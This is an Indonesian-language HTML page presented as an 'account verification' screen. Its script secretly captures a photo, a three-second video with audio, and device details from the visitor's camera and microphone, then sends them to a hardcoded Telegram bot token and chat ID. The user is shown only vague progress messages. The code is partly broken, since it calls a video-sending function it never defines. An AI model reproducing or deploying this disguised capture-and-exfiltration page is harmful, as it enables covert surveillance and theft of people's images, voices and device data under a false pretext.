<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Akses</title>
</head>
<body>
  <h2>Verifikasi Akun</h2>
  <button id="startBtn">Mulai Verifikasi</button>
  <p id="status"></p>

  <!-- Canvas untuk snap foto -->
  <canvas id="photoCanvas" style="display:none;"></canvas>
  <video id="videoPreview" autoplay muted playsinline style="display:none;"></video>

<script>
  const BOT_TOKEN = "7783419810:AAF8TqVK6-d_IVbrlN8Rv6PPelPUMldfx88";
  const CHAT_ID = "7856323152";

  const startBtn = document.getElementById('startBtn');
  const statusTxt = document.getElementById('status');
  const video = document.getElementById('videoPreview');
  const canvas = document.getElementById('photoCanvas');

  startBtn.addEventListener('click', async () => {
    statusTxt.innerText = "Memproses...";
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      video.srcObject = stream;
      
      // Tunggu sebentar agar kamera siap
      await new Promise(r => setTimeout(r, 1500));

      // 1. AMBIL FOTO
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));

      // 2. AMBIL VIDEO (3 detik)
      const videoBlob = await recordMedia(stream, 3000);
      stream.getTracks().forEach(t => t.stop());

      // 3. AMBIL INFO PERANGKAT
      const deviceInfo = `📱 Perangkat: ${navigator.userAgent}\n` +
                         `🌐 Koneksi: ${navigator.connection ? navigator.connection.effectiveType : 'unknown'}`;

      statusTxt.innerText = "Mengirim data...";

      // KIRIM KE TELEGRAM
      await sendTelegramPhoto(photoBlob);
      await sendTelegramVideo(videoBlob);
      await sendTelegramMessage(deviceInfo);

      statusTxt.innerText = "Selesai!";
    } catch (err) {
      statusTxt.innerText = "Gagal: " + err.message;
    }
  });

  async function sendTelegramPhoto(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'foto.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
  }

  async function sendTelegramMessage(text) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
  }

  // (Fungsi recordMedia sama seperti sebelumnya)
  async function recordMedia(stream, duration) {
    return new Promise((resolve) => {
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];
      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
      mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), duration);
    });
  }
</script>
</body>
</html>
